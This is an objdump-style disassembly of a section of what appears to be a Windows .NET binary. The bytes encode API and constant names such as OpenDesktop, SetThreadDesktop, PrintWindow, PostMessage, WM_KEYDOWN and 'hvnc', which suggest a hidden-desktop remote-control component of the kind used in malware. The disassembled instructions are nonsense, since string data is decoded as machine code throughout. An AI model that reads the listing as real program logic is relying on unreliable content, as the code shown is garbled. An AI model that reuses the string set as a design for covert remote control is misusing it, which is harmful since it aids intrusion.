  404d53:	48                   	dec    %eax
  404d54:	45                   	inc    %ebp
  404d55:	45                   	inc    %ebp
  404d56:	4c                   	dec    %esp
  404d57:	00 57 4d             	add    %dl,0x4d(%edi)
  404d5a:	5f                   	pop    %edi
  404d5b:	4b                   	dec    %ebx
  404d5c:	45                   	inc    %ebp
  404d5d:	59                   	pop    %ecx
  404d5e:	44                   	inc    %esp
  404d5f:	4f                   	dec    %edi
  404d60:	57                   	push   %edi
  404d61:	4e                   	dec    %esi
  404d62:	00 57 4d             	add    %dl,0x4d(%edi)
  404d65:	5f                   	pop    %edi
  404d66:	4b                   	dec    %ebx
  404d67:	45                   	inc    %ebp
  404d68:	59                   	pop    %ecx
  404d69:	55                   	push   %ebp
  404d6a:	50                   	push   %eax
  404d6b:	00 57 4d             	add    %dl,0x4d(%edi)
  404d6e:	5f                   	pop    %edi
  404d6f:	43                   	inc    %ebx
  404d70:	48                   	dec    %eax
  404d71:	41                   	inc    %ecx
  404d72:	52                   	push   %edx
  404d73:	00 4d 4b             	add    %cl,0x4b(%ebp)
  404d76:	5f                   	pop    %edi
  404d77:	4c                   	dec    %esp
  404d78:	42                   	inc    %edx
  404d79:	55                   	push   %ebp
  404d7a:	54                   	push   %esp
  404d7b:	54                   	push   %esp
  404d7c:	4f                   	dec    %edi
  404d7d:	4e                   	dec    %esi
  404d7e:	00 4d 4b             	add    %cl,0x4b(%ebp)
  404d81:	5f                   	pop    %edi
  404d82:	52                   	push   %edx
  404d83:	42                   	inc    %edx
  404d84:	55                   	push   %ebp
  404d85:	54                   	push   %esp
  404d86:	54                   	push   %esp
  404d87:	4f                   	dec    %edi
  404d88:	4e                   	dec    %esi
  404d89:	00 50 57             	add    %dl,0x57(%eax)
  404d8c:	5f                   	pop    %edi
  404d8d:	52                   	push   %edx
  404d8e:	45                   	inc    %ebp
  404d8f:	4e                   	dec    %esi
  404d90:	44                   	inc    %esp
  404d91:	45                   	inc    %ebp
  404d92:	52                   	push   %edx
  404d93:	46                   	inc    %esi
  404d94:	55                   	push   %ebp
  404d95:	4c                   	dec    %esp
  404d96:	4c                   	dec    %esp
  404d97:	43                   	inc    %ebx
  404d98:	4f                   	dec    %edi
  404d99:	4e                   	dec    %esi
  404d9a:	54                   	push   %esp
  404d9b:	45                   	inc    %ebp
  404d9c:	4e                   	dec    %esi
  404d9d:	54                   	push   %esp
  404d9e:	00 4f 70             	add    %cl,0x70(%edi)
  404da1:	65 6e                	outsb  %gs:(%esi),(%dx)
  404da3:	44                   	inc    %esp
  404da4:	65 73 6b             	gs jae 0x404e12
  404da7:	74 6f                	je     0x404e18
  404da9:	70 00                	jo     0x404dab
  404dab:	43                   	inc    %ebx
  404dac:	6c                   	insb   (%dx),%es:(%edi)
  404dad:	6f                   	outsl  %ds:(%esi),(%dx)
  404dae:	73 65                	jae    0x404e15
  404db0:	44                   	inc    %esp
  404db1:	65 73 6b             	gs jae 0x404e1f
  404db4:	74 6f                	je     0x404e25
  404db6:	70 00                	jo     0x404db8
  404db8:	53                   	push   %ebx
  404db9:	65 74 54             	gs je  0x404e10
  404dbc:	68 72 65 61 64       	push   $0x64616572
  404dc1:	44                   	inc    %esp
  404dc2:	65 73 6b             	gs jae 0x404e30
  404dc5:	74 6f                	je     0x404e36
  404dc7:	70 00                	jo     0x404dc9
  404dc9:	45                   	inc    %ebp
  404dca:	6e                   	outsb  %ds:(%esi),(%dx)
  404dcb:	75 6d                	jne    0x404e3a
  404dcd:	44                   	inc    %esp
  404dce:	65 73 6b             	gs jae 0x404e3c
  404dd1:	74 6f                	je     0x404e42
  404dd3:	70 57                	jo     0x404e2c
  404dd5:	69 6e 64 6f 77 73 00 	imul   $0x73776f,0x64(%esi),%ebp
  404ddc:	49                   	dec    %ecx
  404ddd:	73 57                	jae    0x404e36
  404ddf:	69 6e 64 6f 77 56 69 	imul   $0x6956776f,0x64(%esi),%ebp
  404de6:	73 69                	jae    0x404e51
  404de8:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  404dec:	49                   	dec    %ecx
  404ded:	73 57                	jae    0x404e46
  404def:	69 6e 64 6f 77 00 47 	imul   $0x4700776f,0x64(%esi),%ebp
  404df6:	65 74 57             	gs je  0x404e50
  404df9:	69 6e 64 6f 77 52 65 	imul   $0x6552776f,0x64(%esi),%ebp
  404e00:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  404e04:	79 73                	jns    0x404e79
  404e06:	74 65                	je     0x404e6d
  404e08:	6d                   	insl   (%dx),%es:(%edi)
  404e09:	2e 54                	cs push %esp
  404e0b:	65 78 74             	gs js  0x404e82
  404e0e:	00 53 74             	add    %dl,0x74(%ebx)
  404e11:	72 69                	jb     0x404e7c
  404e13:	6e                   	outsb  %ds:(%esi),(%dx)
  404e14:	67 42                	addr16 inc %edx
  404e16:	75 69                	jne    0x404e81
  404e18:	6c                   	insb   (%dx),%es:(%edi)
  404e19:	64 65 72 00          	fs gs jb 0x404e1d
  404e1d:	47                   	inc    %edi
  404e1e:	65 74 57             	gs je  0x404e78
  404e21:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  404e28:	78 74                	js     0x404e9e
  404e2a:	00 50 72             	add    %dl,0x72(%eax)
  404e2d:	69 6e 74 57 69 6e 64 	imul   $0x646e6957,0x74(%esi),%ebp
  404e34:	6f                   	outsl  %ds:(%esi),(%dx)
  404e35:	77 00                	ja     0x404e37
  404e37:	50                   	push   %eax
  404e38:	6f                   	outsl  %ds:(%esi),(%dx)
  404e39:	73 74                	jae    0x404eaf
  404e3b:	4d                   	dec    %ebp
  404e3c:	65 73 73             	gs jae 0x404eb2
  404e3f:	61                   	popa
  404e40:	67 65 00 4c 65       	add    %cl,%gs:0x65(%si)
  404e45:	66 74 00             	data16 je 0x404e48
  404e48:	54                   	push   %esp
  404e49:	6f                   	outsl  %ds:(%esi),(%dx)
  404e4a:	70 00                	jo     0x404e4c
  404e4c:	52                   	push   %edx
  404e4d:	69 67 68 74 00 42 6f 	imul   $0x6f420074,0x68(%edi),%esp
  404e54:	74 74                	je     0x404eca
  404e56:	6f                   	outsl  %ds:(%esi),(%dx)
  404e57:	6d                   	insl   (%dx),%es:(%edi)
  404e58:	00 49 6e             	add    %cl,0x6e(%ecx)
  404e5b:	76 6f                	jbe    0x404ecc
  404e5d:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  404e61:	41                   	inc    %ecx
  404e62:	73 79                	jae    0x404edd
  404e64:	6e                   	outsb  %ds:(%esi),(%dx)
  404e65:	63 52 65             	arpl   %edx,0x65(%edx)
  404e68:	73 75                	jae    0x404edf
  404e6a:	6c                   	insb   (%dx),%es:(%edi)
  404e6b:	74 00                	je     0x404e6d
  404e6d:	41                   	inc    %ecx
  404e6e:	73 79                	jae    0x404ee9
  404e70:	6e                   	outsb  %ds:(%esi),(%dx)
  404e71:	63 43 61             	arpl   %eax,0x61(%ebx)
  404e74:	6c                   	insb   (%dx),%es:(%edi)
  404e75:	6c                   	insb   (%dx),%es:(%edi)
  404e76:	62 61 63             	bound  %esp,0x63(%ecx)
  404e79:	6b 00 42             	imul   $0x42,(%eax),%eax
  404e7c:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%bp),%ebp
  404e83:	6f 6b 
  404e85:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  404e89:	64 49                	fs dec %ecx
  404e8b:	6e                   	outsb  %ds:(%esi),(%dx)
  404e8c:	76 6f                	jbe    0x404efd
  404e8e:	6b 65 00 61          	imul   $0x61,0x0(%ebp),%esp
  404e92:	72 67                	jb     0x404efb
  404e94:	73 00                	jae    0x404e96
  404e96:	63 74 78 00          	arpl   %esi,0x0(%eax,%edi,2)
  404e9a:	6a 73                	push   $0x73
  404e9c:	6f                   	outsl  %ds:(%esi),(%dx)
  404e9d:	6e                   	outsb  %ds:(%esi),(%dx)
  404e9e:	00 78 00             	add    %bh,0x0(%eax)
  404ea1:	79 00                	jns    0x404ea3
  404ea3:	62 6d 70             	bound  %ebp,0x70(%ebp)
  404ea6:	00 71 75             	add    %dh,0x75(%ecx)
  404ea9:	61                   	popa
  404eaa:	6c                   	insb   (%dx),%es:(%edi)
  404eab:	69 74 79 00 6b 65 79 	imul   $0x79656b,0x0(%ecx,%edi,2),%esi
  404eb2:	00 
  404eb3:	66 61                	popaw
  404eb5:	6c                   	insb   (%dx),%es:(%edi)
  404eb6:	6c                   	insb   (%dx),%es:(%edi)
  404eb7:	62 61 63             	bound  %esp,0x63(%ecx)
  404eba:	6b 00 73             	imul   $0x73,(%eax),%eax
  404ebd:	00 6c 70 73          	add    %ch,0x73(%eax,%esi,2)
  404ec1:	7a 44                	jp     0x404f07
  404ec3:	65 73 6b             	gs jae 0x404f31
  404ec6:	74 6f                	je     0x404f37
  404ec8:	70 00                	jo     0x404eca
  404eca:	64 77 46             	fs ja  0x404f13
  404ecd:	6c                   	insb   (%dx),%es:(%edi)
  404ece:	61                   	popa
  404ecf:	67 73 00             	addr16 jae 0x404ed2
  404ed2:	66 49                	dec    %cx
  404ed4:	6e                   	outsb  %ds:(%esi),(%dx)
  404ed5:	68 65 72 69 74       	push   $0x74697265
  404eda:	00 64 77 44          	add    %ah,0x44(%edi,%esi,2)
  404ede:	65 73 69             	gs jae 0x404f4a
  404ee1:	72 65                	jb     0x404f48
  404ee3:	64 41                	fs inc %ecx
  404ee5:	63 63 65             	arpl   %esp,0x65(%ebx)
  404ee8:	73 73                	jae    0x404f5d
  404eea:	00 53 79             	add    %dl,0x79(%ebx)
  404eed:	73 74                	jae    0x404f63
  404eef:	65 6d                	gs insl (%dx),%es:(%edi)
  404ef1:	2e 52                	cs push %edx
  404ef3:	75 6e                	jne    0x404f63
  404ef5:	74 69                	je     0x404f60
  404ef7:	6d                   	insl   (%dx),%es:(%edi)
  404ef8:	65 2e 49             	gs cs dec %ecx
  404efb:	6e                   	outsb  %ds:(%esi),(%dx)
  404efc:	74 65                	je     0x404f63
  404efe:	72 6f                	jb     0x404f6f
  404f00:	70 53                	jo     0x404f55
  404f02:	65 72 76             	gs jb  0x404f7b
  404f05:	69 63 65 73 00 4d 61 	imul   $0x614d0073,0x65(%ebx),%esp
  404f0c:	72 73                	jb     0x404f81
  404f0e:	68 61 6c 41 73       	push   $0x73416c61
  404f13:	41                   	inc    %ecx
  404f14:	74 74                	je     0x404f8a
  404f16:	72 69                	jb     0x404f81
  404f18:	62 75 74             	bound  %esi,0x74(%ebp)
  404f1b:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  404f1f:	6d                   	insl   (%dx),%es:(%edi)
  404f20:	61                   	popa
  404f21:	6e                   	outsb  %ds:(%esi),(%dx)
  404f22:	61                   	popa
  404f23:	67 65 64 54          	addr16 gs fs push %esp
  404f27:	79 70                	jns    0x404f99
  404f29:	65 00 68 44          	add    %ch,%gs:0x44(%eax)
  404f2d:	65 73 6b             	gs jae 0x404f9b
  404f30:	74 6f                	je     0x404fa1
  404f32:	70 00                	jo     0x404f34
  404f34:	6c                   	insb   (%dx),%es:(%edi)
  404f35:	70 66                	jo     0x404f9d
  404f37:	6e                   	outsb  %ds:(%esi),(%dx)
  404f38:	00 6c 50 61          	add    %ch,0x61(%eax,%edx,2)
  404f3c:	72 61                	jb     0x404f9f
  404f3e:	6d                   	insl   (%dx),%es:(%edi)
  404f3f:	00 68 57             	add    %ch,0x57(%eax)
  404f42:	6e                   	outsb  %ds:(%esi),(%dx)
  404f43:	64 00 6c 70 52       	add    %ch,%fs:0x52(%eax,%esi,2)
  404f48:	65 63 74 00 4f       	arpl   %esi,%gs:0x4f(%eax,%eax,1)
  404f4d:	75 74                	jne    0x404fc3
  404f4f:	41                   	inc    %ecx
  404f50:	74 74                	je     0x404fc6
  404f52:	72 69                	jb     0x404fbd
  404f54:	62 75 74             	bound  %esi,0x74(%ebp)
  404f57:	65 00 6c 70 53       	add    %ch,%gs:0x53(%eax,%esi,2)
  404f5c:	74 72                	je     0x404fd0
  404f5e:	69 6e 67 00 6e 4d 61 	imul   $0x614d6e00,0x67(%esi),%ebp
  404f65:	78 43                	js     0x404faa
  404f67:	6f                   	outsl  %ds:(%esi),(%dx)
  404f68:	75 6e                	jne    0x404fd8
  404f6a:	74 00                	je     0x404f6c
  404f6c:	68 77 6e 64 00       	push   $0x646e77
  404f71:	68 64 63 42 6c       	push   $0x6c426364
  404f76:	74 00                	je     0x404f78
  404f78:	6e                   	outsb  %ds:(%esi),(%dx)
  404f79:	46                   	inc    %esi
  404f7a:	6c                   	insb   (%dx),%es:(%edi)
  404f7b:	61                   	popa
  404f7c:	67 73 00             	addr16 jae 0x404f7f
  404f7f:	4d                   	dec    %ebp
  404f80:	73 67                	jae    0x404fe9
  404f82:	00 77 50             	add    %dh,0x50(%edi)
  404f85:	61                   	popa
  404f86:	72 61                	jb     0x404fe9
  404f88:	6d                   	insl   (%dx),%es:(%edi)
  404f89:	00 6f 62             	add    %ch,0x62(%edi)
  404f8c:	6a 65                	push   $0x65
  404f8e:	63 74 00 6d          	arpl   %esi,0x6d(%eax,%eax,1)
  404f92:	65 74 68             	gs je  0x404ffd
  404f95:	6f                   	outsl  %ds:(%esi),(%dx)
  404f96:	64 00 63 61          	add    %ah,%fs:0x61(%ebx)
  404f9a:	6c                   	insb   (%dx),%es:(%edi)
  404f9b:	6c                   	insb   (%dx),%es:(%edi)
  404f9c:	62 61 63             	bound  %esp,0x63(%ecx)
  404f9f:	6b 00 72             	imul   $0x72,(%eax),%eax
  404fa2:	65 73 75             	gs jae 0x40501a
  404fa5:	6c                   	insb   (%dx),%es:(%edi)
  404fa6:	74 00                	je     0x404fa8
  404fa8:	43                   	inc    %ebx
  404fa9:	6f                   	outsl  %ds:(%esi),(%dx)
  404faa:	6d                   	insl   (%dx),%es:(%edi)
  404fab:	70 69                	jo     0x405016
  404fad:	6c                   	insb   (%dx),%es:(%edi)
  404fae:	61                   	popa
  404faf:	74 69                	je     0x40501a
  404fb1:	6f                   	outsl  %ds:(%esi),(%dx)
  404fb2:	6e                   	outsb  %ds:(%esi),(%dx)
  404fb3:	52                   	push   %edx
  404fb4:	65 6c                	gs insb (%dx),%es:(%edi)
  404fb6:	61                   	popa
  404fb7:	78 61                	js     0x40501a
  404fb9:	74 69                	je     0x405024
  404fbb:	6f                   	outsl  %ds:(%esi),(%dx)
  404fbc:	6e                   	outsb  %ds:(%esi),(%dx)
  404fbd:	73 41                	jae    0x405000
  404fbf:	74 74                	je     0x405035
  404fc1:	72 69                	jb     0x40502c
  404fc3:	62 75 74             	bound  %esi,0x74(%ebp)
  404fc6:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  404fca:	6e                   	outsb  %ds:(%esi),(%dx)
  404fcb:	74 69                	je     0x405036
  404fcd:	6d                   	insl   (%dx),%es:(%edi)
  404fce:	65 43                	gs inc %ebx
  404fd0:	6f                   	outsl  %ds:(%esi),(%dx)
  404fd1:	6d                   	insl   (%dx),%es:(%edi)
  404fd2:	70 61                	jo     0x405035
  404fd4:	74 69                	je     0x40503f
  404fd6:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  404fd9:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  404fe0:	69 
  404fe1:	62 75 74             	bound  %esi,0x74(%ebp)
  404fe4:	65 00 68 76          	add    %ch,%gs:0x76(%eax)
  404fe8:	6e                   	outsb  %ds:(%esi),(%dx)
  404fe9:	63 00                	arpl   %eax,(%eax)
  404feb:	43                   	inc    %ebx
  404fec:	6f                   	outsl  %ds:(%esi),(%dx)
  404fed:	6e                   	outsb  %ds:(%esi),(%dx)
  404fee:	73 6f                	jae    0x40505f
  404ff0:	6c                   	insb   (%dx),%es:(%edi)
  404ff1:	65 43                	gs inc %ebx
  404ff3:	61                   	popa
  404ff4:	6e                   	outsb  %ds:(%esi),(%dx)
  404ff5:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  404ff8:	45                   	inc    %ebp
  404ff9:	76 65                	jbe    0x405060
  404ffb:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffc:	74 41                	je     0x40503f
  404ffe:	72 67                	jb     0x405067
  405000:	73 00                	jae    0x405002
  405002:	3c 4d                	cmp    $0x4d,%al
  405004:	61                   	popa
  405005:	69 6e 3e 62 5f 5f 30 	imul   $0x305f5f62,0x3e(%esi),%ebp
  40500c:	00 73 65             	add    %dh,0x65(%ebx)
  40500f:	6e                   	outsb  %ds:(%esi),(%dx)
  405010:	64 65 72 00          	fs gs jb 0x405014
  405014:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  405018:	6e                   	outsb  %ds:(%esi),(%dx)
  405019:	73 6f                	jae    0x40508a
  40501b:	6c                   	insb   (%dx),%es:(%edi)
  40501c:	65 43                	gs inc %ebx
  40501e:	61                   	popa
  40501f:	6e                   	outsb  %ds:(%esi),(%dx)
  405020:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  405023:	45                   	inc    %ebp
  405024:	76 65                	jbe    0x40508b
  405026:	6e                   	outsb  %ds:(%esi),(%dx)
  405027:	74 48                	je     0x405071
  405029:	61                   	popa
  40502a:	6e                   	outsb  %ds:(%esi),(%dx)
  40502b:	64 6c                	fs insb (%dx),%es:(%edi)
  40502d:	65 72 00             	gs jb  0x405030
  405030:	43                   	inc    %ebx
  405031:	53                   	push   %ebx
  405032:	24 3c                	and    $0x3c,%al
  405034:	3e 39 5f 5f          	cmp    %ebx,%ds:0x5f(%edi)
  405038:	43                   	inc    %ebx
  405039:	61                   	popa
  40503a:	63 68 65             	arpl   %ebp,0x65(%eax)
  40503d:	64 41                	fs inc %ecx
  40503f:	6e                   	outsb  %ds:(%esi),(%dx)
  405040:	6f                   	outsl  %ds:(%esi),(%dx)
  405041:	6e                   	outsb  %ds:(%esi),(%dx)
  405042:	79 6d                	jns    0x4050b1
  405044:	6f                   	outsl  %ds:(%esi),(%dx)
  405045:	75 73                	jne    0x4050ba
  405047:	4d                   	dec    %ebp
  405048:	65 74 68             	gs je  0x4050b3
  40504b:	6f                   	outsl  %ds:(%esi),(%dx)
  40504c:	64 44                	fs inc %esp
  40504e:	65 6c                	gs insb (%dx),%es:(%edi)
  405050:	65 67 61             	gs addr16 popa
  405053:	74 65                	je     0x4050ba
  405055:	31 00                	xor    %eax,(%eax)
  405057:	43                   	inc    %ebx
  405058:	6f                   	outsl  %ds:(%esi),(%dx)
  405059:	6d                   	insl   (%dx),%es:(%edi)
  40505a:	70 69                	jo     0x4050c5
  40505c:	6c                   	insb   (%dx),%es:(%edi)
  40505d:	65 72 47             	gs jb  0x4050a7
  405060:	65 6e                	outsb  %gs:(%esi),(%dx)
  405062:	65 72 61             	gs jb  0x4050c6
  405065:	74 65                	je     0x4050cc
  405067:	64 41                	fs inc %ecx
  405069:	74 74                	je     0x4050df
  40506b:	72 69                	jb     0x4050d6
  40506d:	62 75 74             	bound  %esi,0x74(%ebp)
  405070:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405074:	74 5f                	je     0x4050d5
  405076:	43                   	inc    %ebx
  405077:	61                   	popa
  405078:	6e                   	outsb  %ds:(%esi),(%dx)
  405079:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  40507c:	00 43 6f             	add    %al,0x6f(%ebx)
  40507f:	6e                   	outsb  %ds:(%esi),(%dx)
  405080:	73 6f                	jae    0x4050f1
  405082:	6c                   	insb   (%dx),%es:(%edi)
  405083:	65 00 61 64          	add    %ah,%gs:0x64(%ecx)
  405087:	64 5f                	fs pop %edi
  405089:	43                   	inc    %ebx
  40508a:	61                   	popa
  40508b:	6e                   	outsb  %ds:(%esi),(%dx)
  40508c:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  40508f:	4b                   	dec    %ebx
  405090:	65 79 50             	gs jns 0x4050e3
  405093:	72 65                	jb     0x4050fa
  405095:	73 73                	jae    0x40510a
  405097:	00 57 72             	add    %dl,0x72(%edi)
  40509a:	69 74 65 4c 69 6e 65 	imul   $0x656e69,0x4c(%ebp,%eiz,2),%esi
  4050a1:	00 
  4050a2:	49                   	dec    %ecx
  4050a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4050a4:	74 33                	je     0x4050d9
  4050a6:	32 00                	xor    (%eax),%al
  4050a8:	49                   	dec    %ecx
  4050a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4050aa:	74 36                	je     0x4050e2
  4050ac:	34 00                	xor    $0x0,%al
  4050ae:	53                   	push   %ebx
  4050af:	79 73                	jns    0x405124
  4050b1:	74 65                	je     0x405118
  4050b3:	6d                   	insl   (%dx),%es:(%edi)
  4050b4:	2e 54                	cs push %esp
  4050b6:	68 72 65 61 64       	push   $0x64616572
  4050bb:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  4050c2:	65 61                	gs popa
  4050c4:	64 53                	fs push %ebx
  4050c6:	74 61                	je     0x405129
  4050c8:	72 74                	jb     0x40513e
  4050ca:	00 54 68 72          	add    %dl,0x72(%eax,%ebp,2)
  4050ce:	65 61                	gs popa
  4050d0:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  4050d4:	74 5f                	je     0x405135
  4050d6:	49                   	dec    %ecx
  4050d7:	73 42                	jae    0x40511b
  4050d9:	61                   	popa
  4050da:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4050dd:	72 6f                	jb     0x40514e
  4050df:	75 6e                	jne    0x40514f
  4050e1:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  4050e5:	74 5f                	je     0x405146
  4050e7:	4e                   	dec    %esi
  4050e8:	61                   	popa
  4050e9:	6d                   	insl   (%dx),%es:(%edi)
  4050ea:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4050ee:	61                   	popa
  4050ef:	72 74                	jb     0x405165
  4050f1:	00 4a 6f             	add    %cl,0x6f(%edx)
  4050f4:	69 6e 00 53 74 72 69 	imul   $0x69727453,0x0(%esi),%ebp
  4050fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4050fc:	67 00 6f 70          	add    %ch,0x70(%bx)
  405100:	5f                   	pop    %edi
  405101:	45                   	inc    %ebp
  405102:	71 75                	jno    0x405179
  405104:	61                   	popa
  405105:	6c                   	insb   (%dx),%es:(%edi)
  405106:	69 74 79 00 54 72 79 	imul   $0x50797254,0x0(%ecx,%edi,2),%esi
  40510d:	50 
  40510e:	61                   	popa
  40510f:	72 73                	jb     0x405184
  405111:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  405115:	74 50                	je     0x405167
  405117:	74 72                	je     0x40518b
  405119:	00 5a 65             	add    %bl,0x65(%edx)
  40511c:	72 6f                	jb     0x40518d
  40511e:	00 4d 61             	add    %cl,0x61(%ebp)
  405121:	72 73                	jb     0x405196
  405123:	68 61 6c 00 47       	push   $0x47006c61
  405128:	65 74 4c             	gs je  0x405177
  40512b:	61                   	popa
  40512c:	73 74                	jae    0x4051a2
  40512e:	57                   	push   %edi
  40512f:	69 6e 33 32 45 72 72 	imul   $0x72724532,0x33(%esi),%ebp
  405136:	6f                   	outsl  %ds:(%esi),(%dx)
  405137:	72 00                	jb     0x405139
  405139:	44                   	inc    %esp
  40513a:	61                   	popa
  40513b:	74 65                	je     0x4051a2
  40513d:	54                   	push   %esp
  40513e:	69 6d 65 00 4d 69 6e 	imul   $0x6e694d00,0x65(%ebp),%ebp
  405145:	56                   	push   %esi
  405146:	61                   	popa
  405147:	6c                   	insb   (%dx),%es:(%edi)
  405148:	75 65                	jne    0x4051af
  40514a:	00 67 65             	add    %ah,0x65(%edi)
  40514d:	74 5f                	je     0x4051ae
  40514f:	55                   	push   %ebp
  405150:	74 63                	je     0x4051b5
  405152:	4e                   	dec    %esi
  405153:	6f                   	outsl  %ds:(%esi),(%dx)
  405154:	77 00                	ja     0x405156
  405156:	54                   	push   %esp
  405157:	69 6d 65 53 70 61 6e 	imul   $0x6e617053,0x65(%ebp),%ebp
  40515e:	00 6f 70             	add    %ch,0x70(%edi)
  405161:	5f                   	pop    %edi
  405162:	53                   	push   %ebx
  405163:	75 62                	jne    0x4051c7
  405165:	74 72                	je     0x4051d9
  405167:	61                   	popa
  405168:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  40516c:	6e                   	outsb  %ds:(%esi),(%dx)
  40516d:	00 67 65             	add    %ah,0x65(%edi)
  405170:	74 5f                	je     0x4051d1
  405172:	54                   	push   %esp
  405173:	6f                   	outsl  %ds:(%esi),(%dx)
  405174:	74 61                	je     0x4051d7
  405176:	6c                   	insb   (%dx),%es:(%edi)
  405177:	53                   	push   %ebx
  405178:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  40517c:	64 73 00             	fs jae 0x40517f
  40517f:	4d                   	dec    %ebp
  405180:	6f                   	outsl  %ds:(%esi),(%dx)
  405181:	6e                   	outsb  %ds:(%esi),(%dx)
  405182:	69 74 6f 72 00 45 6e 	imul   $0x746e4500,0x72(%edi,%ebp,2),%esi
  405189:	74 
  40518a:	65 72 00             	gs jb  0x40518d
  40518d:	45                   	inc    %ebp
  40518e:	78 69                	js     0x4051f9
  405190:	74 00                	je     0x405192
  405192:	53                   	push   %ebx
  405193:	6c                   	insb   (%dx),%es:(%edi)
  405194:	65 65 70 00          	gs gs jo 0x405198
  405198:	49                   	dec    %ecx
  405199:	6d                   	insl   (%dx),%es:(%edi)
  40519a:	61                   	popa
  40519b:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  4051a0:	74 5f                	je     0x405201
  4051a2:	57                   	push   %edi
  4051a3:	69 64 74 68 00 67 65 	imul   $0x74656700,0x68(%esp,%esi,2),%esp
  4051aa:	74 
  4051ab:	5f                   	pop    %edi
  4051ac:	48                   	dec    %eax
  4051ad:	65 69 67 68 74 00 44 	imul   $0x69440074,%gs:0x68(%edi),%esp
  4051b4:	69 
  4051b5:	73 70                	jae    0x405227
  4051b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4051b8:	73 65                	jae    0x40521f
  4051ba:	00 50 69             	add    %dl,0x69(%eax)
  4051bd:	78 65                	js     0x405224
  4051bf:	6c                   	insb   (%dx),%es:(%edi)
  4051c0:	46                   	inc    %esi
  4051c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4051c2:	72 6d                	jb     0x405231
  4051c4:	61                   	popa
  4051c5:	74 00                	je     0x4051c7
  4051c7:	47                   	inc    %edi
  4051c8:	72 61                	jb     0x40522b
  4051ca:	70 68                	jo     0x405234
  4051cc:	69 63 73 00 46 72 6f 	imul   $0x6f724600,0x73(%ebx),%esp
  4051d3:	6d                   	insl   (%dx),%es:(%edi)
  4051d4:	49                   	dec    %ecx
  4051d5:	6d                   	insl   (%dx),%es:(%edi)
  4051d6:	61                   	popa
  4051d7:	67 65 00 47 65       	add    %al,%gs:0x65(%bx)
  4051dc:	74 48                	je     0x405226
  4051de:	64 63 00             	arpl   %eax,%fs:(%eax)
  4051e1:	52                   	push   %edx
  4051e2:	65 6c                	gs insb (%dx),%es:(%edi)
  4051e4:	65 61                	gs popa
  4051e6:	73 65                	jae    0x40524d
  4051e8:	48                   	dec    %eax
  4051e9:	64 63 00             	arpl   %eax,%fs:(%eax)
  4051ec:	49                   	dec    %ecx
  4051ed:	44                   	inc    %esp
  4051ee:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4051f5:	6c                   	insb   (%dx),%es:(%edi)
  4051f6:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  4051fa:	74 68                	je     0x405264
  4051fc:	00 4d 61             	add    %cl,0x61(%ebp)
  4051ff:	78 00                	js     0x405201
  405201:	45                   	inc    %ebp
  405202:	78 63                	js     0x405267
  405204:	65 70 74             	gs jo  0x40527b
  405207:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  40520e:	5f                   	pop    %edi
  40520f:	4d                   	dec    %ebp
  405210:	65 73 73             	gs jae 0x405286
  405213:	61                   	popa
  405214:	67 65 00 43 6f       	add    %al,%gs:0x6f(%bp,%di)
  405219:	6e                   	outsb  %ds:(%esi),(%dx)
  40521a:	63 61 74             	arpl   %esp,0x74(%ecx)
  40521d:	00 6f 70             	add    %ch,0x70(%edi)
  405220:	5f                   	pop    %edi
  405221:	49                   	dec    %ecx
  405222:	6e                   	outsb  %ds:(%esi),(%dx)
  405223:	65 71 75             	gs jno 0x40529b
  405226:	61                   	popa
  405227:	6c                   	insb   (%dx),%es:(%edi)
  405228:	69 74 79 00 3c 3e 63 	imul   $0x5f633e3c,0x0(%ecx,%edi,2),%esi
  40522f:	5f 
  405230:	5f                   	pop    %edi
  405231:	44                   	inc    %esp
  405232:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  405239:	6c                   	insb   (%dx),%es:(%edi)
  40523a:	61                   	popa
  40523b:	73 73                	jae    0x4052b0
  40523d:	39 00                	cmp    %eax,(%eax)
  40523f:	53                   	push   %ebx
  405240:	79 73                	jns    0x4052b5
  405242:	74 65                	je     0x4052a9
  405244:	6d                   	insl   (%dx),%es:(%edi)
  405245:	2e 43                	cs inc %ebx
  405247:	6f                   	outsl  %ds:(%esi),(%dx)
  405248:	6c                   	insb   (%dx),%es:(%edi)
  405249:	6c                   	insb   (%dx),%es:(%edi)
  40524a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40524f:	6e                   	outsb  %ds:(%esi),(%dx)
  405250:	73 2e                	jae    0x405280
  405252:	47                   	inc    %edi
  405253:	65 6e                	outsb  %gs:(%esi),(%dx)
  405255:	65 72 69             	gs jb  0x4052c1
  405258:	63 00                	arpl   %eax,(%eax)
